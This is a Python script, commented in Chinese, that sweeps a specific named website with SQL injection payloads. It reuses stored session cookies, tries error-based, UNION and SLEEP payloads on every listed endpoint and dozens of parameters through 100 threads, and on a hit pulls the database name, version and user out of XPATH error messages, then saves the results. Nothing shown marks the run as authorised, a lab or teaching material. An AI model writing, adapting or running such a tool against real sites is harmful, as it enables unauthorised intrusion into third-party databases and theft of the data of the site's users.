#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class ComprehensiveSQLiAllEndpoints:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.working_endpoints = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_endpoint_sqli(self, endpoint, param, payload, method='GET'):
        """测试端点SQL注入"""
        try:
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
            elif method == 'POST':
                data = {param: payload}
                start = time.time()
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=15)
                elapsed = time.time() - start
            else:
                return None
            
            has_test = 'TEST' in r.text
            has_xpath = 'XPATH' in r.text.upper()
            has_delay = elapsed > 4
            len_diff = len(r.text)
            
            # 检查响应差异
            normal_url = f"{self.base_url}{endpoint}?{param}=1"
            try:
                r_normal = self.session.get(normal_url, timeout=5)
                len_diff = abs(len(r.text) - len(r_normal.text))
            except:
                pass
            
            if has_test or has_xpath or (has_delay and len_diff > 100):
                result = {
                    'endpoint': endpoint,
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'status': r.status_code,
                    'len': len(r.text),
                    'len_diff': len_diff,
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_delay': has_delay,
                    'elapsed': elapsed,
                    'response_preview': r.text[:500]
                }
                
                if has_xpath:
                    match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                    if match:
                        result['extracted'] = match.group(1)
                
                return result
        except:
            pass
        
        return None
    
    def extract_database(self, endpoint, param, method='GET'):
        """从有效端点提取数据库"""
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
        ]
        
        extracted = {}
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            
            try:
                if method == 'GET':
                    url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                    r = self.session.get(url, timeout=10)
                else:
                    data = {param: payload}
                    r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
                
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    value = match.group(1)
                    if value and value != 'TEST':
                        extracted[label] = value
            except:
                pass
        
        return extracted
    
    def test_all_endpoints(self):
        """测试所有端点"""
        print("[*] 加载所有端点...")
        try:
            with open('all_endpoints.json', 'r') as f:
                endpoints = json.load(f)
        except:
            endpoints = []
        
        print(f"[*] 共 {len(endpoints)} 个端点待测试")
        
        params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 'customer_id', 'customerID',
                  'q', 'query', 'search', 'keyword', 'name', 'email', 'mobile', 'phone',
                  'MobileNumber', 'Email', 'Password', 'Type', 'DistrictID', 'ProvinceID',
                  'WareHouseID', 'GroupPermissionID', 'username', 'user', 'uid', 'page', 'limit',
                  'offset', 'sort', 'order', 'filter', 'value', 'data', 'input', 'param']
        
        payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--",
            "1' UNION SELECT 'TEST'--",
            "1' AND SLEEP(5)--",
        ]
        
        methods = ['GET', 'POST']
        
        print("[*] 开始全面测试...")
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            for endpoint in endpoints:
                for param in params:
                    for payload in payloads:
                        for method in methods:
                            futures.append(executor.submit(self.test_endpoint_sqli, endpoint, param, payload, method))
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % 100 == 0:
                    print(f"    [进度] {completed}/{len(futures)}")
                
                result = future.result()
                if result:
                    print(f"\n    [!] {result['method']} {result['endpoint']} [{result['param']}] - XPATH: {result['has_xpath']}, 延迟: {result['has_delay']}, 长度差异: {result['len_diff']}")
                    if result.get('extracted'):
                        print(f"        [+] 提取: {result['extracted']}")
                    self.working_endpoints.append(result)
                    
                    # 尝试提取数据库
                    if result.get('has_xpath'):
                        extracted = self.extract_database(result['endpoint'], result['param'], result['method'])
                        if extracted:
                            self.db_info.update(extracted)
                            for k, v in extracted.items():
                                print(f"        [+] {k}: {v}")
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("全面SQL注入测试 - 所有端点")
        print("="*60)
        
        self.test_all_endpoints()
        
        # 保存结果
        with open('comprehensive_sqli_all_endpoints_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'working_endpoints': self.working_endpoints,
                'db_info': self.db_info,
                'summary': {
                    'total_working': len(self.working_endpoints),
                    'with_xpath': len([r for r in self.working_endpoints if r.get('has_xpath')]),
                    'with_delay': len([r for r in self.working_endpoints if r.get('has_delay')]),
                    'db_extracted': len(self.db_info)
                }
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("最终结果")
        print("="*60)
        print(f"有效注入点: {len(self.working_endpoints)}")
        print(f"XPATH错误: {len([r for r in self.working_endpoints if r.get('has_xpath')])}")
        print(f"时间延迟: {len([r for r in self.working_endpoints if r.get('has_delay')])}")
        print(f"数据库信息: {len(self.db_info)}")
        for k, v in self.db_info.items():
            print(f"  {k}: {v}")

if __name__ == "__main__":
    scanner = ComprehensiveSQLiAllEndpoints()
    scanner.run_all()